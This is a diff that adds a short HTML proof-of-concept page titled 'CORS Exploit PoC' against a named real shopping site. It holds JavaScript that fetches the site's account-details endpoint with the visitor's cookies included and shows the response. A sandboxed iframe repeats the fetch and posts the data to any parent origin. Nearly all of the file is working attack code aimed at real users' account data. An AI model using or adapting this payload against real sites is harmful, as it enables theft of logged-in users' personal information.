@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>CORS Exploit PoC</title>
+</head>
+<body>
+<h3>CORS Exploit PoC</h3>
+<button onclick="exploit()">Exploit</button>
+ 
+    <script>
+
+        function exploit() {
+
+            fetch("https://www.firstcry.com/accountdetails", {
+
+                method: "GET",
+
+                credentials: "include" // Send authentication cookies
+
+            })
+
+            .then(response => response.text())
+
+            .then(data => {
+
+                console.log("Response from vulnerable API:", data);
+
+                document.body.innerHTML += "<pre>" + data + "</pre>";
+
+            })
+
+            .catch(error => console.log("Error:", error));
+
+        }
+</script>
+ 
+    <h3>Iframe Sandbox Exploit</h3>
+<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="
+<script>
+
+    fetch('https://www.firstcry.com/accountdetails', {
+
+        method: 'GET',
+
+        credentials: 'include'
+
+    }).then(response => response.text())
+
+      .then(data => parent.postMessage(data, '*'))
+
+      .catch(error => console.log('Error:', error));
+</script>
+
+    "></iframe>
+</body>
+</html>
+
+FirstCry Account Login
+ 
